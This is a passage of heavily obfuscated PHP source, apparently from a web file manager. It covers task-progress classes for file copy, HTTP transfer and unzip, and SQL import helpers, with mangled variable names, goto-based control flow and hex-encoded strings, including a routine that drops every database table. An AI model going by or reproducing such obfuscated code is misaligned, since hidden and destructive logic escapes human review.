$a¡´½Ôá– = 500 + 1; while (!feof($D“É¡äº÷¦)) { if ($Bø÷çôß î && $FÍ®Œ¥À¦À != 0) { $Bø÷çôß î->task[$fÇ–½Òê·Å[970]] += 1; } $FÍ®Œ¥À¦À++; $CäáÜöÄŠ˜ = trim(fgets($D“É¡äº÷¦)); $AãŒí®ˆƒ .= $fÇ–½Òê·Å[50] . $this->sqlDecode($CäáÜöÄŠ˜, $this->type); if ($FÍ®Œ¥À¦À == $a¡´½Ôá–) { $AãŒí®ˆƒ = rtrim(trim($AãŒí®ˆƒ), $fÇ–½Òê·Å[67]); if (!$bˆœîôîÛ°->execute($AãŒí®ˆƒ)) { return !1; } if ($Bø÷çôß î) { $Bø÷çôß î->update($FÍ®Œ¥À¦À - 1); } $AãŒí®ˆƒ = $fÇ–½Òê·Å[33]; $FÍ®Œ¥À¦À = 0; } } fclose($D“É¡äº÷¦); goto Dè±±‰î½–; Dù†Â·øĞ„: $fÇ–½Òê·Å =& $_SERVER[îÖ]; $bˆœîôîÛ° = $this->model()->db(); $D“É¡äº÷¦ = @fopen($fŞö„Œ‰‹, $fÇ–½Òê·Å[983]); goto F«–º‡ÛÍ; Dè±±‰î½–: if (trim($AãŒí®ˆƒ)) { $AãŒí®ˆƒ = rtrim(trim($AãŒí®ˆƒ), $fÇ–½Òê·Å[67]); if (!$bˆœîôîÛ°->execute($AãŒí®ˆƒ)) { return !1; } if ($Bø÷çôß î) { $Bø÷çôß î->update($FÍ®Œ¥À¦À - 1); } } return !0; goto dÒµö„„©ã; F«–º‡ÛÍ: if (!$D“É¡äº÷¦) { return !1; } $FÍ®Œ¥À¦À = 0; $AãŒí®ˆƒ = $fÇ–½Òê·Å[33]; goto f¤Æ•ÌƒŞ¼; dÒµö„„©ã: } public function dropTable($eé£©àáÑì = null) { $BšªáÜç = $this->model()->db(); $cÃâ´ô“…± = $eé£©àáÑì ? array($eé£©àáÑì) : $BšªáÜç->getTables(); if (!$cÃâ´ô“…±) { return; } foreach ($cÃâ´ô“…± as $eé£©àáÑì) { $BšªáÜç->execute("\144\x72\x6f\x70\40\164\141\x62\x6c\145\x20\x69\x66\40\x65\x78\151\x73\164\163\40\x60{$eé£©àáÑì}\140"); } } private function taskToCache($CŸƒ¿ƒÉ‚ = null) { $b·ŞìÖù±° =& $_SERVER[îÖ]; if (!$CŸƒ¿ƒÉ‚) { return; } $fó…—×‹ÇÒ = array($b·ŞìÖù±°[972] => $CŸƒ¿ƒÉ‚->task[$b·ŞìÖù±°[972]], $b·ŞìÖù±°[970] => $CŸƒ¿ƒÉ‚->task[$b·ŞìÖù±°[970]], $b·ŞìÖù±°[984] => $CŸƒ¿ƒÉ‚->task[$b·ŞìÖù±°[984]]); if ($fó…—×‹ÇÒ[$b·ŞìÖù±°[970]] == $fó…—×‹ÇÒ[$b·ŞìÖù±°[984]]) { $fó…—×‹ÇÒ[$b·ŞìÖù±°[695]] = 1; } Cache::set($b·ŞìÖù±°[985] . $CŸƒ¿ƒÉ‚->task[$b·ŞìÖù±°[367]], $fó…—×‹ÇÒ); $CŸƒ¿ƒÉ‚->end(); } private function sqlEncode($f×ä¯ÏÌêĞ) { $a¹ËŒ¾É®ñ =& $_SERVER[îÖ]; $f¦¼•ö³‚‡ = array(); foreach ($f×ä¯ÏÌêĞ as $d°óĞâÔ‹›) { if (is_array($d°óĞâÔ‹›)) { $d°óĞâÔ‹› = json_encode_force($d°óĞâÔ‹›); } $d°óĞâÔ‹› = addslashes($d°óĞâÔ‹›); $d°óĞâÔ‹› = str_replace(array($a¹ËŒ¾É®ñ[986], $a¹ËŒ¾É®ñ[217]), array($a¹ËŒ¾É®ñ[987], $a¹ËŒ¾É®ñ[988]), $d°óĞâÔ‹›); $f¦¼•ö³‚‡[] = str_replace($a¹ËŒ¾É®ñ[55], $a¹ËŒ¾É®ñ[989], $d°óĞâÔ‹›); } return $a¹ËŒ¾É®ñ[55] . implode($a¹ËŒ¾É®ñ[990], $f¦¼•ö³‚‡) . $a¹ËŒ¾É®ñ[55]; } private function sqlDecode($CîÌÔíóĞ, $bßß«êÈ½¶) { $eë¼ë¯Â˜¶ =& $_SERVER[îÖ]; $CîÌÔíóĞ = str_replace(array($eë¼ë¯Â˜¶[987], $eë¼ë¯Â˜¶[988]), array($eë¼ë¯Â˜¶[986], $eë¼ë¯Â˜¶[217]), $CîÌÔíóĞ); if ($bßß«êÈ½¶ == $eë¼ë¯Â˜¶[9]) { $CîÌÔíóĞ = stripslashes($CîÌÔíóĞ); } return $CîÌÔíóĞ; } } goto dƒæï¥œœ; eà…ì…¶ôÒ: define($_SERVER[îÖ][1928], 3); define($_SERVER[îÖ][1929], 4); define($_SERVER[îÖ][1930], 5); goto eÖô³„—½³; FÅ°Ô‘Ä‰Œ: class TaskFileTransfer extends Task { protected function startAfter() { goto dæ¼ƒğëˆô; AŠ£ÁØ¤º: $BóÃ¤ĞÜë‚[$Aº¦ÍŸŸ¤•[972]] = $Aº¦ÍŸŸ¤•[33]; $BóÃ¤ĞÜë‚[$Aº¦ÍŸŸ¤•[1478]] = $Aº¦ÍŸŸ¤•[33]; $BóÃ¤ĞÜë‚[$Aº¦ÍŸŸ¤•[1479]] = 0; goto eåË¡¢Ğ¨®; FåˆƒÅ‡‘¡: Hook::bind($Aº¦ÍŸŸ¤•[539], array($this, $Aº¦ÍŸŸ¤•[1461])); Hook::bind($Aº¦ÍŸŸ¤•[540], array($this, $Aº¦ÍŸŸ¤•[1462])); Hook::bind($Aº¦ÍŸŸ¤•[542], array($this, $Aº¦ÍŸŸ¤•[1463])); goto e£î¤å‡”¤; DÌŸ¸ÚÛÈ¤: $BóÃ¤ĞÜë‚[$Aº¦ÍŸŸ¤•[1474]] = LNG($Aº¦ÍŸŸ¤•[1475]); $BóÃ¤ĞÜë‚[$Aº¦ÍŸŸ¤•[1476]] = 0; $BóÃ¤ĞÜë‚[$Aº¦ÍŸŸ¤•[1477]] = 0; goto AŠ£ÁØ¤º; e¥„Ãß£ÈÑ: Hook::bind($Aº¦ÍŸŸ¤•[1468], array($this, $Aº¦ÍŸŸ¤•[1469])); Hook::bind($Aº¦ÍŸŸ¤•[1470], array($this, $Aº¦ÍŸŸ¤•[1471])); Hook::bind($Aº¦ÍŸŸ¤•[1472], array($this, $Aº¦ÍŸŸ¤•[1473])); goto DÌŸ¸ÚÛÈ¤; Dáå›‘ê¬: Hook::bind($Aº¦ÍŸŸ¤•[511], array($this, $Aº¦ÍŸŸ¤•[1464])); Hook::bind($Aº¦ÍŸŸ¤•[513], array($this, $Aº¦ÍŸŸ¤•[1464])); Hook::bind($Aº¦ÍŸŸ¤•[515], array($this, $Aº¦ÍŸŸ¤•[1464])); goto a”‘¤ˆ§òË; a”‘¤ˆ§òË: Hook::bind($Aº¦ÍŸŸ¤•[1465], array($this, $Aº¦ÍŸŸ¤•[1466])); Hook::bind($Aº¦ÍŸŸ¤•[532], array($this, $Aº¦ÍŸŸ¤•[1467])); $this->sourceModelCopyFlag = !1; goto e¥„Ãß£ÈÑ; Bìö»‚íˆ: Hook::bind($Aº¦ÍŸŸ¤•[1455], array($this, $Aº¦ÍŸŸ¤•[1456])); Hook::bind($Aº¦ÍŸŸ¤•[1457], array($this, $Aº¦ÍŸŸ¤•[1458])); Hook::bind($Aº¦ÍŸŸ¤•[1459], array($this, $Aº¦ÍŸŸ¤•[1460])); goto FåˆƒÅ‡‘¡; dæ¼ƒğëˆô: $Aº¦ÍŸŸ¤• =& $_SERVER[îÖ]; $BóÃ¤ĞÜë‚ =& $this->task; $this->sourceCopyFolder = !1; goto Bìö»‚íˆ; e£î¤å‡”¤: Hook::bind($Aº¦ÍŸŸ¤•[543], array($this, $Aº¦ÍŸŸ¤•[1463])); Hook::bind($Aº¦ÍŸŸ¤•[509], array($this, $Aº¦ÍŸŸ¤•[1464])); Hook::bind($Aº¦ÍŸŸ¤•[506], array($this, $Aº¦ÍŸŸ¤•[1464])); goto Dáå›‘ê¬; eåË¡¢Ğ¨®: $BóÃ¤ĞÜë‚[$Aº¦ÍŸŸ¤•[1480]] = 0; $BóÃ¤ĞÜë‚[$Aº¦ÍŸŸ¤•[1481]] = 0; if (!$BóÃ¤ĞÜë‚[$Aº¦ÍŸŸ¤•[1337]]) { $BóÃ¤ĞÜë‚[$Aº¦ÍŸŸ¤•[1337]] = LNG($Aº¦ÍŸŸ¤•[1482]); } goto dÇáäïÛíå; dÇáäïÛíå: } protected function endAfter() { goto aİ×êœÇÌ¸; EåÈÄ Ûæ: Hook::unbind($FñÆº¥ªÜ[515], array($this, $FñÆº¥ªÜ[1464])); Hook::unbind($FñÆº¥ªÜ[1465], array($this, $FñÆº¥ªÜ[1466])); Hook::unbind($FñÆº¥ªÜ[532], array($this, $FñÆº¥ªÜ[1467])); goto e—ŒÅÙá; e—ŒÅÙá: Hook::unbind($FñÆº¥ªÜ[1468], array($this, $FñÆº¥ªÜ[1469])); Hook::unbind($FñÆº¥ªÜ[1470], array($this, $FñÆº¥ªÜ[1471])); Hook::unbind($FñÆº¥ªÜ[1472], array($this, $FñÆº¥ªÜ[1473])); goto cÅ¼—Øñ‡–; Fİ‡Â²·İ: Hook::unbind($FñÆº¥ªÜ[542], array($this, $FñÆº¥ªÜ[1463])); Hook::unbind($FñÆº¥ªÜ[543], array($this, $FñÆº¥ªÜ[1463])); Hook::unbind($FñÆº¥ªÜ[509], array($this, $FñÆº¥ªÜ[1464])); goto B¦ŒÂìÉë; B¦ŒÂìÉë: Hook::unbind($FñÆº¥ªÜ[506], array($this, $FñÆº¥ªÜ[1464])); Hook::unbind($FñÆº¥ªÜ[511], array($this, $FñÆº¥ªÜ[1464])); Hook::unbind($FñÆº¥ªÜ[513], array($this, $FñÆº¥ªÜ[1464])); goto EåÈÄ Ûæ; aİ×êœÇÌ¸: $FñÆº¥ªÜ =& $_SERVER[îÖ]; Hook::unbind($FñÆº¥ªÜ[1455], array($this, $FñÆº¥ªÜ[1456])); Hook::unbind($FñÆº¥ªÜ[1457], array($this, $FñÆº¥ªÜ[1458])); goto dã°ÛÙƒÙ; dã°ÛÙƒÙ: Hook::unbind($FñÆº¥ªÜ[1459], array($this, $FñÆº¥ªÜ[1460])); Hook::unbind($FñÆº¥ªÜ[539], array($this, $FñÆº¥ªÜ[1461])); Hook::unbind($FñÆº¥ªÜ[540], array($this, $FñÆº¥ªÜ[1462])); goto Fİ‡Â²·İ; cÅ¼—Øñ‡–: } public function copyMoveStart($d›ö«æŠ‡õ, $Aˆõ°¬Õ¦è, $cïÙÄÓ½Úç, $D§ò²Ñİïñ) { goto CÀƒ¦Ğ™º; EªÌÂÊ°”: $DºíîÛœÎÓ[$bŠŒîÒ¬ÎÈ[1484]] = KodIO::transferType($d›ö«æŠ‡õ, $cïÙÄÓ½Úç); $this->update(); goto b¤Æêòõ×Æ; CÀƒ¦Ğ™º: $bŠŒîÒ¬ÎÈ =& $_SERVER[îÖ]; self::log($bŠŒîÒ¬ÎÈ[1483] . $Aˆõ°¬Õ¦è . $bŠŒîÒ¬ÎÈ[66] . $D§ò²Ñİïñ); $BÙ ¹‹ˆÌÂ = rtrim(TEMP_FILES, $bŠŒîÒ¬ÎÈ[8]); goto eïæ¥äÜóÑ; eïæ¥äÜóÑ: if (substr($Aˆõ°¬Õ¦è, 0, strlen($BÙ ¹‹ˆÌÂ)) == $BÙ ¹‹ˆÌÂ) { return; } if (substr($D§ò²Ñİïñ, 0, strlen($BÙ ¹‹ˆÌÂ)) == $BÙ ¹‹ˆÌÂ) { return; } $DºíîÛœÎÓ =& $this->task; goto EªÌÂÊ°”; b¤Æêòõ×Æ: } public function updateAfter() { goto AØÍ’Ìœº½; AØÍ’Ìœº½: $fŸÌ¼Ì‰æ— =& $_SERVER[îÖ]; $cË‹í¨ÏÑô =& $this->task; if (!$cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[697]]) { return; } goto dŒÏ÷¤±Ë; dŒÏ÷¤±Ë: if ($this->sourceModelCopyFlag) { return; } if ($cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1484]] == $fŸÌ¼Ì‰æ—[1088]) { return; } if ($cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1484]] == $fŸÌ¼Ì‰æ—[1034] || $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1484]] == $fŸÌ¼Ì‰æ—[103]) { if ($cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1478]]) { $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1481]] = $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1480]] + $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1477]]; } } else { if ($cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1484]] == $fŸÌ¼Ì‰æ—[1089]) { if ($cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1478]] == $fŸÌ¼Ì‰æ—[1034]) { $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1481]] = $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1480]] + $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1477]] * 0.5; } else { if ($cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1478]] == $fŸÌ¼Ì‰æ—[103]) { $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1481]] = $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1480]] + $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1476]] * 0.5 + $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1477]] * 0.5; } } } } goto F»®ëÍÓ×—; F»®ëÍÓ×—: $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1432]] = $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1481]] / $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[697]]; if ($cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1432]] > 0) { $EñŞ»İÜ•õ = timeFloat() - $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1434]] - $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1437]]; $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1438]] = $EñŞ»İÜ•õ * (1 - $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1432]]) / $cË‹í¨ÏÑô[$fŸÌ¼Ì‰æ—[1432]]; } goto eÚŞ®ÒÓ¯¡; eÚŞ®ÒÓ¯¡: } public function addPath($f°òäùšÄ¿) { goto BêÉçâŠÌÀ; C­Æ”Ï¿¼: if ($ešÒğ”¹[$cä‹…¹•ˆŠ[29]] == $cä‹…¹•ˆŠ[167]) { $c½ÁÒËÄòĞ[$cä‹…¹•ˆŠ[970]] += 1; } else { $c½ÁÒËÄòĞ[$cä‹…¹•ˆŠ[970]] += $ešÒğ”¹[$cä‹…¹•ˆŠ[80]][$cä‹…¹•ˆŠ[78]]; if ($ešÒğ”¹[$cä‹…¹•ˆŠ[369]]) { $c½ÁÒËÄòĞ[$cä‹…¹•ˆŠ[970]] += $ešÒğ”¹[$cä‹…¹•ˆŠ[80]][$cä‹…¹•ˆŠ[79]] + 1; } } $c½ÁÒËÄòĞ[$cä‹…¹•ˆŠ[697]] += $ešÒğ”¹[$cä‹…¹•ˆŠ[77]]; $this->update(); goto dä¸ù£¦; BêÉçâŠÌÀ: $cä‹…¹•ˆŠ =& $_SERVER[îÖ]; if (!$f°òäùšÄ¿) { return; } $c½ÁÒËÄòĞ =& $this->task; goto c½×”÷ç®; c½×”÷ç®: $ešÒğ”¹ = IO::infoWithChildren($f°òäùšÄ¿); $cí±ÆÑÖ™Ç = $c½ÁÒËÄòĞ[$cä‹…¹•ˆŠ[1485]] ? $c½ÁÒËÄòĞ[$cä‹…¹•ˆŠ[1485]][$cä‹…¹•ˆŠ[1486]] : 0; $c½ÁÒËÄòĞ[$cä‹…¹•ˆŠ[1485]] = array($cä‹…¹•ˆŠ[1486] => $cí±ÆÑÖ™Ç + 1, $cä‹…¹•ˆŠ[386] => $ešÒğ”¹[$cä‹…¹•ˆŠ[28]], $cä‹…¹•ˆŠ[75] => $ešÒğ”¹[$cä‹…¹•ˆŠ[75]], $cä‹…¹•ˆŠ[466] => $ešÒğ”¹[$cä‹…¹•ˆŠ[466]] ? $ešÒğ”¹[$cä‹…¹•ˆŠ[466]] : $ešÒğ”¹[$cä‹…¹•ˆŠ[75]]); goto C­Æ”Ï¿¼; dä¸ù£¦: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($dŞâÔÌ‘Ì) { $CÓËœƒ¥®  =& $_SERVER[îÖ]; $fùÙù¯èè =& $this->task; $fùÙù¯èè[$CÓËœƒ¥® [1474]] = $dŞâÔÌ‘Ì[$CÓËœƒ¥® [28]]; $fùÙù¯èè[$CÓËœƒ¥® [972]] = $dŞâÔÌ‘Ì[$CÓËœƒ¥® [28]]; $this->update(); } public function copyFileStart($bË¢ˆßóÉĞ, $D…«æƒÌŸ®, $Eº¹àøò»é, $FÅ·‹¯Î×Œ, $eƒƒå“‹†±, $a‡Œ¶»Ô›) { goto Dàõï›ŠÔÔ; EÎ„ÃÕ”™´: $f†ÃœçÒŠ[$eÑ¾ÅéÂŒ…[972]] = $eÑ¾ÅéÂŒ…[33]; $f†ÃœçÒŠ[$eÑ¾ÅéÂŒ…[1478]] = $eÑ¾ÅéÂŒ…[33]; $f†ÃœçÒŠ[$eÑ¾ÅéÂŒ…[1479]] = 0; goto d¡£—¬Ñå; b„–é¸¡ä“: $GLOBALS[$eÑ¾ÅéÂŒ…[1488]] = $eƒƒå“‹†±; $GLOBALS[$eÑ¾ÅéÂŒ…[1487]] = $a‡Œ¶»Ô›; $f†ÃœçÒŠ =& $this->task; goto cõ“¯Õ¯¹·; cõ“¯Õ¯¹·: $f†ÃœçÒŠ[$eÑ¾ÅéÂŒ…[1474]] = $aÑšˆÆˆµ±; $f†ÃœçÒŠ[$eÑ¾ÅéÂŒ…[1476]] = (int) $bË¢ˆßóÉĞ->size($D…«æƒÌŸ®); $f†ÃœçÒŠ[$eÑ¾ÅéÂŒ…[1477]] = 0; goto EÎ„ÃÕ”™´; d¡£—¬Ñå: $this->update(); goto Eª¸çˆ¼ö¬; Dàõï›ŠÔÔ: $eÑ¾ÅéÂŒ… =& $_SERVER[îÖ]; $aÑšˆÆˆµ± = $eƒƒå“‹†±; if ($aÑšˆÆˆµ± == $GLOBALS[$eÑ¾ÅéÂŒ…[1487]]) { $aÑšˆÆˆµ± = $GLOBALS[$eÑ¾ÅéÂŒ…[1488]]; } goto b„–é¸¡ä“; Eª¸çˆ¼ö¬: } public function copyFileEnd($e‚ØÙ Â, $b…õ„ì¶´ê, $C÷ìêÁ„Œ, $f§É›¦ƒ†¥, $EõƒÒ¬È, $aãòÓÈ‡Ø—) { $DˆÁğÇÜƒĞ =& $_SERVER[îÖ]; $Aœ¨¼¦ã¹ª =& $this->task; $Aœ¨¼¦ã¹ª[$DˆÁğÇÜƒĞ[1477]] = $Aœ¨¼¦ã¹ª[$DˆÁğÇÜƒĞ[1476]]; $Aœ¨¼¦ã¹ª[$DˆÁğÇÜƒĞ[1478]] = $DˆÁğÇÜƒĞ[33]; if ($EõƒÒ¬È == $Aœ¨¼¦ã¹ª[$DˆÁğÇÜƒĞ[1474]]) { $Aœ¨¼¦ã¹ª[$DˆÁğÇÜƒĞ[1480]] += $Aœ¨¼¦ã¹ª[$DˆÁğÇÜƒĞ[1476]]; $Aœ¨¼¦ã¹ª[$DˆÁğÇÜƒĞ[1481]] = $Aœ¨¼¦ã¹ª[$DˆÁğÇÜƒĞ[1480]]; $this->update(1); } else { $this->update(); $Aœ¨¼¦ã¹ª[$DˆÁğÇÜƒĞ[1477]] = 0; } self::log($DˆÁğÇÜƒĞ[1489] . $b…õ„ì¶´ê . $DˆÁğÇÜƒĞ[66] . $f§É›¦ƒ†¥ . $DˆÁğÇÜƒĞ[217] . $EõƒÒ¬È . $DˆÁğÇÜƒĞ[1490] . $Aœ¨¼¦ã¹ª[$DˆÁğÇÜƒĞ[1474]]); } public function updateFileEnd($dâµÅä©ëí, $E Ô¦éáÁ) { goto BæË¤·ìä; E´Ó•ŠÇö‘: $this->update(1); self::log($cªõ¼®¶Ì[1491] . $dâµÅä©ëí); goto fª”ÎÙê¯¼; cÀ¢ÍİÉÎ‰: $A‚âš‘Ó¡[$cªõ¼®¶Ì[1476]] = $E Ô¦éáÁ; $A‚âš‘Ó¡[$cªõ¼®¶Ì[1480]] += $E Ô¦éáÁ; $A‚âš‘Ó¡[$cªõ¼®¶Ì[1481]] = $A‚âš‘Ó¡[$cªõ¼®¶Ì[1480]]; goto E´Ó•ŠÇö‘; BæË¤·ìä: $cªõ¼®¶Ì =& $_SERVER[îÖ]; $A‚âš‘Ó¡ =& $this->task; $A‚âš‘Ó¡[$cªõ¼®¶Ì[1474]] = $dâµÅä©ëí; goto cÀ¢ÍİÉÎ‰; fª”ÎÙê¯¼: } public function sourceModelCopy($C¶ÇêÁå±) { goto F¢â×¨‚‘Ï; b°¤¬¬Âô×: switch ($Aë¬™¾™é) { case $F‡¨‡¯“è[507]: $E‘íØ¢œÉƒ = 1; break; case $F‡¨‡¯“è[510]: $DØ†İô£å‚[$F‡¨‡¯“è[1474]] = $DÖĞÚòäÁÒ[$F‡¨‡¯“è[28]]; break; case $F‡¨‡¯“è[512]: $E‘íØ¢œÉƒ = intval($C¶ÇêÁå±[$F‡¨‡¯“è[363]] * 0.4); break; case $F‡¨‡¯“è[514]: $E‘íØ¢œÉƒ = intval($C¶ÇêÁå±[$F‡¨‡¯“è[363]] * 0.2); break; case $F‡¨‡¯“è[516]: $E‘íØ¢œÉƒ = intval($C¶ÇêÁå±[$F‡¨‡¯“è[363]] * 0.4); break; } $this->update($E‘íØ¢œÉƒ); $this->sourceModelCopyFlag = !1; goto FÑé±ˆÔŞ¨; e­ñ‹Ê¹â¸: $DØ†İô£å‚ =& $this->task; $this->sourceModelCopyFlag = !0; $E‘íØ¢œÉƒ = 0; goto b°¤¬¬Âô×; F¢â×¨‚‘Ï: $F‡¨‡¯“è =& $_SERVER[îÖ]; $Aë¬™¾™é = $C¶ÇêÁå±[0]; $DÖĞÚòäÁÒ = $C¶ÇêÁå±[1]; goto e­ñ‹Ê¹â¸; FÑé±ˆÔŞ¨: } public function sourceRemove($A©Éƒ†¿†, $B»šŒĞ) { $EÛÜÚœ• =& $_SERVER[îÖ]; $this->sourceModelCopyFlag = !0; $fŒµ•á¶¥˜ = 1; if (isset($A©Éƒ†¿†[$EÛÜÚœ•[80]])) { $fŒµ•á¶¥˜ = $A©Éƒ†¿†[$EÛÜÚœ•[80]][$EÛÜÚœ•[78]] + $A©Éƒ†¿†[$EÛÜÚœ•[80]][$EÛÜÚœ•[79]] + 1; } $this->update($fŒµ•á¶¥˜); $this->sourceModelCopyFlag = !1; } public function sourceMove($cÀÚä »ÀÛ) { $this->sourceRemove($cÀÚä »ÀÛ, !1); } public function curlProgress($BØ“Øá­‰§, $fùÚÎö‘éŒ, $A»Œ©Œø¯, $Dƒ¦ù§’âë, $aª†·¾ôÌ©) { $fÀ÷ñ‰îä® =& $_SERVER[îÖ]; $dÉ…äÍÂî¢ =& $this->task; if ($aª†·¾ôÌ© > 0) { $dÉ…äÍÂî¢[$fÀ÷ñ‰îä®[972]] = $fÀ÷ñ‰îä®[1492]; $dÉ…äÍÂî¢[$fÀ÷ñ‰îä®[1478]] = $fÀ÷ñ‰îä®[103]; if ($dÉ…äÍÂî¢[$fÀ÷ñ‰îä®[1476]] == $Dƒ¦ù§’âë || $Dƒ¦ù§’âë > 1024 * 1024) { $dÉ…äÍÂî¢[$fÀ÷ñ‰îä®[1477]] = $aª†·¾ôÌ©; } if ($dÉ…äÍÂî¢[$fÀ÷ñ‰îä®[1479]]) { $dÉ…äÍÂî¢[$fÀ÷ñ‰îä®[1477]] = $aª†·¾ôÌ© + $dÉ…äÍÂî¢[$fÀ÷ñ‰îä®[1479]]; } } else { if ($A»Œ©Œø¯ > 0) { if ($dÉ…äÍÂî¢[$fÀ÷ñ‰îä®[1476]] == $fùÚÎö‘éŒ) { $dÉ…äÍÂî¢[$fÀ÷ñ‰îä®[1477]] = $A»Œ©Œø¯; $dÉ…äÍÂî¢[$fÀ÷ñ‰îä®[972]] = $fÀ÷ñ‰îä®[1493]; $dÉ…äÍÂî¢[$fÀ÷ñ‰îä®[1478]] = $fÀ÷ñ‰îä®[1034]; } } } $this->update(); } public function curlProgressStart($DêâÖñ÷ŞÔ) { } public function curlProgressEnd($fÉŞ‡ƒÆ±) { $B­¼‘±ïèæ =& $_SERVER[îÖ]; $d¹Ä·µª‡Œ =& $this->task; $cÕˆö®Üİ¹ = curl_getinfo($fÉŞ‡ƒÆ±); $c‚……Úè¥ = $cÕˆö®Üİ¹[$B­¼‘±ïèæ[1494]]; if ($d¹Ä·µª‡Œ[$B­¼‘±ïèæ[1478]] == $B­¼‘±ïèæ[103] && $c‚……Úè¥) { $d¹Ä·µª‡Œ[$B­¼‘±ïèæ[1479]] += $c‚……Úè¥; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $CÕì•½Ë =& $_SERVER[îÖ]; $DÑ“³êÂ³ =& $this->task; $DÑ“³êÂ³[$CÕì•½Ë[1495]] = 1; Hook::bind($CÕì•½Ë[1468], array($this, $CÕì•½Ë[1496])); Hook::bind($CÕì•½Ë[1470], array($this, $CÕì•½Ë[1497])); Hook::bind($CÕì•½Ë[1472], array($this, $CÕì•½Ë[1498])); } protected function endAfter() { $e‰·Áš”“ =& $_SERVER[îÖ]; Hook::unbind($e‰·Áš”“[1468], array($this, $e‰·Áš”“[1496])); Hook::unbind($e‰·Áš”“[1470], array($this, $e‰·Áš”“[1497])); Hook::unbind($e‰·Áš”“[1472], array($this, $e‰·Áš”“[1498])); } public function progressStart($FËàšƒ‚…) { $eÜ•ïöõè =& $_SERVER[îÖ]; $C³¿–“ğéê = curl_getinfo($FËàšƒ‚…); self::log($eÜ•ïöõè[1499] . $C³¿–“ğéê[$eÜ•ïöõè[295]]); self::valueSet($this->task[$eÜ•ïöõè[367]], $this->task); } public function progressEnd($B´ÏÛ¬Œ») { $BÕ„¦ÂÒÚ =& $_SERVER[îÖ]; self::log($BÕ„¦ÂÒÚ[1500] . $this->task[$BÕ„¦ÂÒÚ[367]]); $this->end(); } public function progress($cÃÚçË­¤‰, $cá«±¦†„ô, $cˆÅ»ê¹ã, $cÆĞò¥ÑÉ, $EèÜ³ª²¢å) { $A‰ë×³¯¹ =& $_SERVER[îÖ]; $b¥¤ãƒ¾™è =& $this->task; if ($EèÜ³ª²¢å > 0) { $b¥¤ãƒ¾™è[$A‰ë×³¯¹[970]] = $b¥¤ãƒ¾™è[$A‰ë×³¯¹[970]] == 0 ? $cÆĞò¥ÑÉ : $b¥¤ãƒ¾™è[$A‰ë×³¯¹[970]]; $b¥¤ãƒ¾™è[$A‰ë×³¯¹[984]] = $EèÜ³ª²¢å; } else { if ($cˆÅ»ê¹ã > 0) { $b¥¤ãƒ¾™è[$A‰ë×³¯¹[970]] = $b¥¤ãƒ¾™è[$A‰ë×³¯¹[970]] == 0 ? $cá«±¦†„ô : $b¥¤ãƒ¾™è[$A‰ë×³¯¹[970]]; $b¥¤ãƒ¾™è[$A‰ë×³¯¹[984]] = $cˆÅ»ê¹ã; } } $this->update(); self::log("\x70\162\x6f\147\x72\x65\x73\x73\x48\164\164\160\x3a\x64\x6f\167\x6e\72{$cˆÅ»ê¹ã}\x2f{$cá«±¦†„ô}\x3b\40\165\x70\154\157\x61\144\x3a{$EèÜ³ª²¢å}\57{$cÆĞò¥ÑÉ}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto bÈ‘‰š¶·¶; bÈ‘‰š¶·¶: $Fâé¥ÈÖ¤³ =& $_SERVER[îÖ]; parent::startAfter(); Hook::bind($Fâé¥ÈÖ¤³[1501], array($this, $Fâé¥ÈÖ¤³[1502])); goto e‘¤öŞŒ»„; e‘¤öŞŒ»„: Hook::bind($Fâé¥ÈÖ¤³[1029], array($this, $Fâé¥ÈÖ¤³[1503])); $AÆŒà…‚¼ =& $this->task; $AÆŒà…‚¼[$Fâé¥ÈÖ¤³[1504]] = $Fâé¥ÈÖ¤³[1034]; goto f³µ‰ù¶¦÷; f³µ‰ù¶¦÷: if (!$AÆŒà…‚¼[$Fâé¥ÈÖ¤³[1337]]) { $AÆŒà…‚¼[$Fâé¥ÈÖ¤³[1337]] = LNG($Fâé¥ÈÖ¤³[1505]); } goto a’Ç‰ˆÁğ; a’Ç‰ˆÁğ: } protected function endAfter() { $Aƒ¾ãÏ¹îÒ =& $_SERVER[îÖ]; parent::endAfter(); Hook::unbind($Aƒ¾ãÏ¹îÒ[1501], array($this, $Aƒ¾ãÏ¹îÒ[1502])); Hook::unbind($Aƒ¾ãÏ¹îÒ[1029], array($this, $Aƒ¾ãÏ¹îÒ[1503])); } public function updateAfter() { $A¤£Ã»Û³Ò =& $_SERVER[îÖ]; $dÎ¾ô„ïÁá =& $this->task; if (!$dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[970]] || !$dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[697]]) { return; } if ($dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1504]] == $A¤£Ã»Û³Ò[1034]) { $d´¼Âˆì× = 0; if ($dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1476]]) { $d´¼Âˆì× = 